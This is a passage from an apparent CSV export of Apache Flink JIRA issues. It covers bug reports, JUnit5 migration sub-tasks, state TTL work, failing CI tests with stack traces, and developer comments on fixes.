!20230512152023.jpg!",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"12/May/23 07:22;Wencong Liu;20230512152023.jpg;https://issues.apache.org/jira/secure/attachment/13058032/20230512152023.jpg",,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri May 12 16:14:55 UTC 2023,,,,,,,,,,"0|z1humo:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"12/May/23 07:44;mapohl;Thanks for reporting this, [~Wencong Liu]. [~jingge] [~wangyang0918] may someone have a look at this? Looks like there are some problems with the CIBot deployment?

CC: [~snuyanzin] fyi;;;","12/May/23 07:45;martijnvisser;I've raised this to a Blocker. ;;;","12/May/23 15:29;jingge;working on it;;;","12/May/23 16:14;jingge;should work now, please check and share the feedback for confirmation;;;",,,,,,,,,,,,,,,,,,,
Got NoSuchFileException when initialize source function.,FLINK-32065,13535915,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,SpongebobZ,SpongebobZ,12/May/23 06:09,15/May/23 04:01,04/Jun/24 20:41,,1.14.4,,,,,,,,,,,,,,,,,,,,Runtime / Network,,,,0,,,,"When I submit an application to flink standalone cluster, I got a NoSuchFileException. I think it was failed to create the tmp channel file but I am confused about the reason relative to this case.

I found that this sub-directory `flink-netty-shuffle-xxx` was not existed, so is this diretory only working for that step of the application ?

BTW, this issue happen coincidently.

!image-2023-05-12-14-07-45-771.png!",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"12/May/23 06:08;SpongebobZ;image-2023-05-12-14-07-45-771.png;https://issues.apache.org/jira/secure/attachment/13058026/image-2023-05-12-14-07-45-771.png","12/May/23 06:26;SpongebobZ;image-2023-05-12-14-26-46-268.png;https://issues.apache.org/jira/secure/attachment/13058027/image-2023-05-12-14-26-46-268.png","12/May/23 09:37;SpongebobZ;image-2023-05-12-17-37-09-002.png;https://issues.apache.org/jira/secure/attachment/13058035/image-2023-05-12-17-37-09-002.png",,,,,,,,,,,,,,,,3.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri May 12 11:14:43 UTC 2023,,,,,,,,,,"0|z1huk0:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"12/May/23 08:31;Thesharing;Hi, [~SpongebobZ] Would you please upload the full log of the TaskExecutor? It seems this issue happens during the initialization of BoundedBlockingPartitions. This folder is used by blocking shuffle.;;;","12/May/23 09:39;SpongebobZ;Hi, [~Thesharing] , may be I could provide these logs for you.

!image-2023-05-12-17-37-09-002.png!;;;","12/May/23 10:03;Thesharing;It's hard to investigate the root cause with the limited context. Maybe full logs would be helpful. {{NoSuchFileException}} is thrown during the creation of {{{}FileChannelBoundedData{}}}. This is a bit of weird. Maybe it's because the path is deleted during the initialization of {{{}ResultPartitions{}}}.

Maybe you could try to change the location of temp files to another path. Change the value of configuration {{io.tmp.dirs}} to another valid path and see if this issue is solved.;;;","12/May/23 11:14;SpongebobZ;Hi [~Thesharing] Does it likelihood due to the incorrect starting of the standalone cluster? Such as secondary starting the cluster before it is stopped.;;;",,,,,,,,,,,,,,,,,,,
Add subdirectory of test output file  for JsonPlanTest to indicate the plan's version,FLINK-32064,13535821,13532429,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Won't Do,qingyue,qingyue,qingyue,11/May/23 14:35,15/May/23 12:52,04/Jun/24 20:41,15/May/23 12:51,1.18.0,,,,,,,,,,,,,,1.18.0,,,,,,Table SQL / Planner,,,,0,pull-request-available,,,This is a preparation for upgrading some ExecNodes(which translate to stateful operators) version to 2,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon May 15 12:52:43 UTC 2023,,,,,,,,,,"0|z1htz4:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"15/May/23 12:52;qingyue;After an offline discussion with [~godfreyhe], we have decided to select a portion of the existing JSON files as test specs for the upgrade tests, and directly adapt the remaining tests to the new exec version to avoid excessive redundancy in the test files.;;;",,,,,,,,,,,,,,,,,,,,,,
AWS CI mvn compile fails to cast objects to parent type.,FLINK-32063,13535782,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,Not A Problem,,chalixar,chalixar,11/May/23 11:59,27/May/24 09:31,04/Jun/24 20:41,27/May/24 09:31,,,,,,,,,,,,,,,,,,,,,Connectors / AWS,Tests,,,0,test-stability,,,"h2. Description

AWS Connectors CI fails to cast {{TestSinkInitContext}} into base type {{InitContext}},

- Failure
https://github.com/apache/flink-connector-aws/actions/runs/4924790308/jobs/8841458606?pr=70
 

",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri May 12 08:44:17 UTC 2023,,,,,,,,,,"0|z1htqg:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"12/May/23 08:44;chalixar;So apparently the CI patches the changes to main before running tests.
The issue was due to an un-rebased change from main.
Even though this is an untraditional way for running CI this is not an issue.
Please close as ""not an issue"".;;;",,,,,,,,,,,,,,,,,,,,,,
Expose MetricGroup in FlinkResourceListener interface to allow users to create custom metrics per cluster,FLINK-32062,13535776,,Improvement,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,,,tamirsagi,tamirsagi,11/May/23 11:07,11/May/23 11:52,04/Jun/24 20:41,,,,,,,,,,,,,,,,,,,,,,Kubernetes Operator,,,,0,flink-kubernetes-operator,,,"The operator supports pluggable {{FlinkResourceListener}} which provides the events & deployment status. However, such interface does not expose MetricManager/any way to create custom meters.
Which means that if users would like to create custom metrics per deployments(failures rate, scaling counter, any other metric per events) there is no way to attach it via operator metric system.

There are some basic metrics created per namespace in

{{org.apache.flink.kubernetes.operator.metrics.FlinkDeploymentMetrics}}

My suggestion is to expose either operator metric manager or another entity which provides a way to create meters(and internally registers them via MetricManager) in FlinkResourceListener interface.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-05-11 11:07:29.0,,,,,,,,,,"0|z1htp4:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Resource metric groups are not cleaned up on removal,FLINK-32061,13535773,,Bug,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,mxm,mxm,mxm,11/May/23 10:56,11/May/23 11:13,04/Jun/24 20:41,11/May/23 11:11,,,,,,,,,,,,,,,kubernetes-operator-1.5.0,,,,,,Autoscaler,Kubernetes Operator,,,0,,,,Not cleaning up leaks memory.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-05-11 10:56:08.0,,,,,,,,,,"0|z1htog:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Migrate subclasses of BatchAbstractTestBase in table and other modules to JUnit5,FLINK-32060,13535764,13535743,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,Weijie Guo,tanyuxin,tanyuxin,11/May/23 10:13,18/Sep/23 07:08,04/Jun/24 20:41,16/May/23 12:39,1.18.0,,,,,,,,,,,,,,1.18.0,,,,,,Tests,,,,0,pull-request-available,,,,Migrate subclasses of BatchAbstractTestBase in table and other modules to JUnit5.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue May 16 12:38:56 UTC 2023,,,,,,,,,,"0|z1htmg:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"16/May/23 12:38;Weijie Guo;master(1.18) via ce286c969a5b3914cdb993e94bff4f42e0c6599b.;;;",,,,,,,,,,,,,,,,,,,,,,
Migrate subclasses of BatchAbstractTestBase in batch.sql.agg and batch.sql.join to JUnit5,FLINK-32059,13535763,13535743,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,Wencong Liu,tanyuxin,tanyuxin,11/May/23 10:10,09/Jun/23 06:07,04/Jun/24 20:41,09/Jun/23 06:07,1.18.0,,,,,,,,,,,,,,1.18.0,,,,,,Tests,,,,0,pull-request-available,,,Migrate subclasses of BatchAbstractTestBase in batch.sql.agg and batch.sql.join to JUnit5.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Jun 09 06:07:38 UTC 2023,,,,,,,,,,"0|z1htm8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"09/Jun/23 06:07;Weijie Guo;master(1.18) via a86b89b4223ee125c6427e6e8ebc8847ede7f6c9.;;;",,,,,,,,,,,,,,,,,,,,,,
Migrate subclasses of BatchAbstractTestBase in runtime.batch.sql to JUnit5,FLINK-32058,13535762,13535743,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Done,tanyuxin,tanyuxin,tanyuxin,11/May/23 10:08,18/Sep/23 07:08,04/Jun/24 20:41,22/May/23 11:54,1.18.0,,,,,,,,,,,,,,1.18.0,,,,,,Tests,,,,0,pull-request-available,,,Migrate subclasses of BatchAbstractTestBase in runtime.batch.sql to JUnit5.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon May 22 11:54:16 UTC 2023,,,,,,,,,,"0|z1htm0:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"22/May/23 11:54;Weijie Guo;master(1.18) via 70ac66d567e483b084d528a60f5153aa38a19dbf.;;;",,,,,,,,,,,,,,,,,,,,,,
Autoscaler should use the new vertex resource api in 1.18,FLINK-32057,13535746,,New Feature,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,Fixed,gyfora,gyfora,gyfora,11/May/23 07:56,25/Jun/23 14:15,04/Jun/24 20:41,25/Jun/23 14:15,,,,,,,,,,,,,,,,,,,,,Autoscaler,Kubernetes Operator,,,1,pull-request-available,,,"Flink 1.18 introduces a new rest api for changing vertex parallelisms on the fly with the adaptive scheduler.

We should build support for this into the operator autoscaler which has the potential to significantly improve rescale times and job stability",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Sun Jun 25 14:15:54 UTC 2023,,,,,,,,,,"0|z1htig:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"25/Jun/23 14:15;gyfora;Merged to main:
4d9615f5c76672c9b324ed8f4876d62af7fef60e..3bb4fcc6a0247f63177a2720f54d71834dd25c49;;;",,,,,,,,,,,,,,,,,,,,,,
Update the used Pulsar connector in flink-python to 4.0.0,FLINK-32056,13535745,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Critical,Fixed,martijnvisser,martijnvisser,martijnvisser,11/May/23 07:44,23/May/23 12:10,04/Jun/24 20:41,23/May/23 12:03,1.17.1,1.18.0,,,,,,,,,,,,,1.17.2,1.18.0,,,,,API / Python,Connectors / Pulsar,,,0,pull-request-available,,,"flink-python still references and tests flink-connector-pulsar:3.0.0, while it should be using flink-connector-pulsar:4.0.0. That's because the newer version is the only version compatible with Flink 1.17 and it doesn't rely on flink-shaded. ",,,,,,,,,,,,FLINK-32032,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue May 23 12:03:17 UTC 2023,,,,,,,,,,"0|z1hti8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"23/May/23 12:03;dianfu;Fixed in:
- master via fbf7b91424ec626ae56dd2477347a7759db6d5fe
- release-1.17 via d3a3755a7eef5708871580671169fd6bd2babf28;;;",,,,,,,,,,,,,,,,,,,,,,
Migrate all subclasses of BatchAbstractTestBase to JUnit5,FLINK-32055,13535743,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Done,tanyuxin,tanyuxin,tanyuxin,11/May/23 07:38,18/Sep/23 07:06,04/Jun/24 20:41,09/Jun/23 06:11,1.18.0,,,,,,,,,,,,,,1.18.0,,,,,,Tests,,,,0,Umbrella,,,"After [FLINK-30815|https://issues.apache.org/jira/browse/FLINK-30815], we should also migrate all the subclasses of BatchAbstractTestBase to JUnit5.

Because there are too many classes to migrate, we can split these classes into 3 sub-tasks.",,,,,,,,,,,,,FLINK-25325,,,,,,,,,,,,,FLINK-30815,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-05-11 07:38:10.0,,,,,,,,,,"0|z1hths:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ElasticsearchSinkITCase.testElasticsearchSink fails on AZP,FLINK-32054,13535730,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Critical,Won't Fix,,Sergey Nuyanzin,Sergey Nuyanzin,11/May/23 07:08,12/May/23 05:36,04/Jun/24 20:41,12/May/23 05:36,1.16.1,,,,,,,,,,,,,,,,,,,,Connectors / ElasticSearch,,,,0,test-stability,,,"Test ElasticsearchSinkITCase.testElasticsearchSink fails on AZP
{noformat}
May 11 02:00:56 Caused by: org.elasticsearch.client.ResponseException: org.elasticsearch.client.ResponseException: method [HEAD], host [http://172.17.0.1:50560], URI [/], status line [HTTP/1.1 503 Service Unavailable]
May 11 02:00:56 	at org.elasticsearch.client.RestClient$1.completed(RestClient.java:552)
May 11 02:00:56 	at org.elasticsearch.client.RestClient$1.completed(RestClient.java:537)
May 11 02:00:56 	at org.apache.http.concurrent.BasicFuture.completed(BasicFuture.java:122)
May 11 02:00:56 	at org.apache.http.impl.nio.client.DefaultClientExchangeHandlerImpl.responseCompleted(DefaultClientExchangeHandlerImpl.java:177)
May 11 02:00:56 	at org.apache.http.nio.protocol.HttpAsyncRequestExecutor.processResponse(HttpAsyncRequestExecutor.java:436)
May 11 02:00:56 	at org.apache.http.nio.protocol.HttpAsyncRequestExecutor.responseReceived(HttpAsyncRequestExecutor.java:309)
May 11 02:00:56 	at org.apache.http.impl.nio.DefaultNHttpClientConnection.consumeInput(DefaultNHttpClientConnection.java:255)
May 11 02:00:56 	at org.apache.http.impl.nio.client.InternalIODispatch.onInputReady(InternalIODispatch.java:81)
May 11 02:00:56 	at org.apache.http.impl.nio.client.InternalIODispatch.onInputReady(InternalIODispatch.java:39)
May 11 02:00:56 	at org.apache.http.impl.nio.reactor.AbstractIODispatch.inputReady(AbstractIODispatch.java:114)
May 11 02:00:56 	at org.apache.http.impl.nio.reactor.BaseIOReactor.readable(BaseIOReactor.java:162)
May 11 02:00:56 	at org.apache.http.impl.nio.reactor.AbstractIOReactor.processEvent(AbstractIOReactor.java:337)
May 11 02:00:56 	at org.apache.http.impl.nio.reactor.AbstractIOReactor.processEvents(AbstractIOReactor.java:315)
May 11 02:00:56 	at org.apache.http.impl.nio.reactor.AbstractIOReactor.execute(AbstractIOReactor.java:276)
May 11 02:00:56 	at org.apache.http.impl.nio.reactor.BaseIOReactor.execute(BaseIOReactor.java:104)
May 11 02:00:56 	at org.apache.http.impl.nio.reactor.AbstractMultiworkerIOReactor$Worker.run(AbstractMultiworkerIOReactor.java:588)
May 11 02:00:56 	... 1 more
May 11 02:00:56 

{noformat}
https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=48891&view=logs&j=4eda0b4a-bd0d-521a-0916-8285b9be9bb5&t=2ff6d5fa-53a6-53ac-bff7-fa524ea361a9&l=15299",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri May 12 05:36:19 UTC 2023,,,,,,,,,,"0|z1htew:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"11/May/23 08:02;martijnvisser;I think this will be a won't fix, given that 1.16 is the only release left where Elasticsearch is still part of the flink repo itself;;;","12/May/23 05:36;Sergey Nuyanzin;yes, probably you're right at least log the issue
I will close it since ES is now in it's own repo;;;",,,,,,,,,,,,,,,,,,,,,
Introduce StateMetadata to ExecNode to support configure operator-level state TTL via CompiledPlan,FLINK-32053,13535726,13532429,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,qingyue,qingyue,qingyue,11/May/23 06:46,21/Jul/23 03:19,04/Jun/24 20:41,05/Jun/23 11:19,1.18.0,,,,,,,,,,,,,,1.18.0,,,,,,Table SQL / Planner,,,,0,pull-request-available,,,"This subtask should introduce StateMetadata to all ExecNodes that translate to stateful operators, changing the way how `#translateToPlanInternal` get the state retention time. The affected `ExecNode` list
{code:java}
    StreamExecChangelogNormalize
    StreamExecDeduplicate
    StreamExecGlobalGroupAggregate
    StreamExecGroupAggregate
    StreamExecIncrementalGroupAggregate
    StreamExecJoin
    StreamExecLimit
    StreamExecLookupJoin
    StreamExecRank
    StreamExecSink
    StreamExecSortLimit
{code}

Since we have upgraded some `ExecNode`s to version 2, we have to test the following 3 parts:
1. the plans serialized using version 1 can be deserialized using the current version.
2. the plans with the current version SerDe work as expected.
3. The way by modifying the JSON content to change state TTL works as expected.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon Jun 05 11:19:36 UTC 2023,,,,,,,,,,"0|z1hte0:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"05/Jun/23 11:19;luoyuxia;master: 69def87107a3b2faef09efaae2702a202d07a9cb;;;",,,,,,,,,,,,,,,,,,,,,,
Introduce left and right state retention time to StreamingJoinOperator,FLINK-32052,13535725,13532429,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,qingyue,qingyue,qingyue,11/May/23 06:36,16/May/23 09:38,04/Jun/24 20:41,16/May/23 09:38,1.18.0,,,,,,,,,,,,,,1.18.0,,,,,,Table SQL / Runtime,,,,0,pull-request-available,,,"According to the FLIP design, we should introduce separate TTL variables to the TwoInputStreamOperator, like StreamingJoinOperator and StreamingAntiJoinOperator.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue May 16 09:38:55 UTC 2023,,,,,,,,,,"0|z1htds:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"16/May/23 09:38;godfrey;Fixed in master: 5ba3f2bdea6fc7c9e58b50200806ea341b7dd3d3

 ;;;",,,,,,,,,,,,,,,,,,,,,,
Fix broken documentation links in Flink blogs,FLINK-32051,13535721,,Improvement,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,Fixed,Thesharing,Thesharing,Thesharing,11/May/23 06:04,26/May/23 09:27,04/Jun/24 20:41,26/May/23 09:27,,,,,,,,,,,,,,,,,,,,,Project Website,,,,0,pull-request-available,,,"Currently, the links to the documentations in the blogs are broken. We need to add a slash ({{{}/{}}}) at the end of the param {{DocsBaseUrl}} in config.toml like this:
{noformat}
[params]
  DocsBaseUrl = ""//nightlies.apache.org/flink/""
{noformat}
Also, the links in this [post|https://flink.apache.org/2022/01/04/how-we-improved-scheduler-performance-for-large-scale-jobs-part-two/] is not rendered correctly. We need to add a newline after the {{{}<br/>{}}}.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri May 26 09:27:23 UTC 2023,,,,,,,,,,"0|z1htcw:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"26/May/23 09:27;Weijie Guo;merged in b64f8efce94018b87a4046c6c4d01e0aed1f5ab5.;;;",,,,,,,,,,,,,,,,,,,,,,
Bump Jackson to 2.14.3,FLINK-32050,13535718,,Technical Debt,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,Sergey Nuyanzin,Sergey Nuyanzin,Sergey Nuyanzin,11/May/23 05:56,05/Jun/23 15:03,04/Jun/24 20:41,05/Jun/23 15:03,,,,,,,,,,,,,,,1.18.0,,,,,,,,,,0,,,,"There is FLINK-32032 with upgrade of flink-shaded where flink-shaded's jackson is bumping to 2.14.x.
It would make sense also bump transitive dep jackson",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon Jun 05 15:03:12 UTC 2023,,,,,,,,,,"0|z1htc8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"05/Jun/23 15:03;martijnvisser;Fixed in master: 0a41a660600b225aea537ac75956b3dc8a5a3c16;;;",,,,,,,,,,,,,,,,,,,,,,
CoordinatedSourceRescaleITCase.testDownscaling fails on AZP,FLINK-32049,13535687,,Bug,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Critical,Fixed,fanrui,Sergey Nuyanzin,Sergey Nuyanzin,10/May/23 18:48,13/Jul/23 11:03,04/Jun/24 20:41,13/Jul/23 11:03,1.17.1,1.18.0,,,,,,,,,,,,,1.17.2,1.18.0,,,,,Connectors / Common,,,,0,pull-request-available,test-stability,,"CoordinatedSourceRescaleITCase.testDownscaling fails with
{noformat}
May 08 03:19:14 [ERROR] Failures: 
May 08 03:19:14 [ERROR]   CoordinatedSourceRescaleITCase.testDownscaling:75->resumeCheckpoint:107 
May 08 03:19:14 Multiple Failures (1 failure)
May 08 03:19:14 -- failure 1 --
May 08 03:19:14 [Any cause contains message 'successfully restored checkpoint'] 
May 08 03:19:14 Expecting any element of:
May 08 03:19:14   [org.apache.flink.runtime.client.JobExecutionException: Job execution failed.
May 08 03:19:14 	at org.apache.flink.runtime.jobmaster.JobResult.toJobExecutionResult(JobResult.java:144)
May 08 03:19:14 	at org.apache.flink.runtime.minicluster.MiniClusterJobClient.lambda$getJobExecutionResult$3(MiniClusterJobClient.java:141)
May 08 03:19:14 	at java.util.concurrent.CompletableFuture.uniApply(CompletableFuture.java:616)
May 08 03:19:14 	...(45 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed),
May 08 03:19:14     org.apache.flink.runtime.JobException: Recovery is suppressed by NoRestartBackoffTimeStrategy
May 08 03:19:14 	at org.apache.flink.runtime.executiongraph.failover.flip1.ExecutionFailureHandler.handleFailure(ExecutionFailureHandler.java:139)
May 08 03:19:14 	at org.apache.flink.runtime.executiongraph.failover.flip1.ExecutionFailureHandler.getFailureHandlingResult(ExecutionFailureHandler.java:83)
May 08 03:19:14 	at org.apache.flink.runtime.scheduler.DefaultScheduler.recordTaskFailure(DefaultScheduler.java:258)
May 08 03:19:14 	...(35 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed),
May 08 03:19:14     java.lang.IllegalStateException: This executor has been registered.
May 08 03:19:14 	at org.apache.flink.util.Preconditions.checkState(Preconditions.java:193)
May 08 03:19:14 	at org.apache.flink.runtime.checkpoint.channel.ChannelStateWriteRequestExecutorImpl.registerSubtask(ChannelStateWriteRequestExecutorImpl.java:341)
May 08 03:19:14 	at org.apache.flink.runtime.checkpoint.channel.ChannelStateWriteRequestExecutorFactory.getOrCreateExecutor(ChannelStateWriteRequestExecutorFactory.java:63)
May 08 03:19:14 	...(17 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)]
May 08 03:19:14 to satisfy the given assertions requirements but none did:
May 08 03:19:14 
May 08 03:19:14 org.apache.flink.runtime.client.JobExecutionException: Job execution failed.
May 08 03:19:14 	at org.apache.flink.runtime.jobmaster.JobResult.toJobExecutionResult(JobResult.java:144)
May 08 03:19:14 	at org.apache.flink.runtime.minicluster.MiniClusterJobClient.lambda$getJobExecutionResult$3(MiniClusterJobClient.java:141)
May 08 03:19:14 	at java.util.concurrent.CompletableFuture.uniApply(CompletableFuture.java:616)
May 08 03:19:14 	...(45 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
May 08 03:19:14 error: 
May 08 03:19:14 Expecting throwable message:
May 08 03:19:14   ""Job execution failed.""
May 08 03:19:14 to contain:
May 08 03:19:14   ""successfully restored checkpoint""
May 08 03:19:14 but did not.
May 08 03:19:14 

{noformat}
https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=48772&view=logs&j=fc7981dc-d266-55b0-5fff-f0d0a2294e36&t=1a9b228a-3e0e-598f-fc81-c321539dfdbf&l=7191",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"12/Jul/23 06:33;fanrui;logs-cron_azure-test_cron_azure_connect_2-1686196685.zip;https://issues.apache.org/jira/secure/attachment/13061275/logs-cron_azure-test_cron_azure_connect_2-1686196685.zip",,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Jul 13 11:03:12 UTC 2023,,,,,,,,,,"0|z1ht5c:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"12/Jun/23 11:24;Sergey Nuyanzin;Same for testUpscaling
https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=49750&view=logs&j=fc7981dc-d266-55b0-5fff-f0d0a2294e36&t=1a9b228a-3e0e-598f-fc81-c321539dfdbf&l=7575;;;","11/Jul/23 08:39;Weijie Guo;I have some suspicion that this is because {{ChannelStateWriteRequestExecutorFactory#getOrCreateExecutor}} may have obtained an already registered executor. That is to say, there is a possibility that {{isRegistering}} has become false, but {{onRegistered}} has not been called yet, so the executor is still not null. 

I am not very familiar with related codes, so I cannot fully confirm this argument. [~fanrui] Can you help confirm this? If there is indeed a possibility, I'd like to fix this.;;;","12/Jul/23 06:28;fanrui;Thanks report this JIRA, and thanks [~Weijie Guo] 's analysis, there is indeed a thread safety bug here.

There are three cases that update registering from true to false:
 # Registered maxSubtasksPerChannelStateFile subtasks to the executor
 # checkpoint started
 # A subtask is released

Offline discussed with [~Weijie Guo] , the case1 is thread safe, the case2 and case3 are thread-unsafe.

h1. The reason about this bug:

When one subtask is closing, it will call the ChannelStateWriteRequestExecutorImpl#releaseSubtask. The [releaseSubtask method|https://github.com/apache/flink/blob/2dfff436c09821fb658bf8d289206b9ef85bb25b/flink-runtime/src/main/java/org/apache/flink/runtime/checkpoint/channel/ChannelStateWriteRequestExecutorImpl.java#L390] will hold 2 locks at the different time.

